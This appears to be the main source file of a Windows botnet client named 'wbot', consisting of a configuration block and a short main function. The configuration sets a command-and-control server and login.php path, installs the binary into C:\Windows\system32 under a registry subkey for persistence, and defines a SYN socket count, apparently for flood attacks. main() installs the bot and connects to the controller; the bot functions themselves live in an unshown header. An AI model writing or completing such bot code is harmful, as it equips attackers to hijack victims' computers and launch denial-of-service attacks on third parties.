#include "headers.h"
/*###########################################################################################*/
/*##############################HERE BEGINS THE CONFIG PART##################################*/
/*###########################################################################################*/
string server="localhost";	
string location="wbot/login.php";//location of login php
string install_location="C:\\Windows\\system32\\wbot.exe";
string install_regestry_subkey="wbot";
#define SKYSYN_SOCKETS 100
/*###########################################################################################*/
/*################################HERE ENDS THE CONFIG PART##################################*/
/*###########################################################################################*/
#include "botfunctions.h"


//-------------------------------------main-------------------------------------
int main(){//WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	
	install();
        connect(0);
	return 0;
}
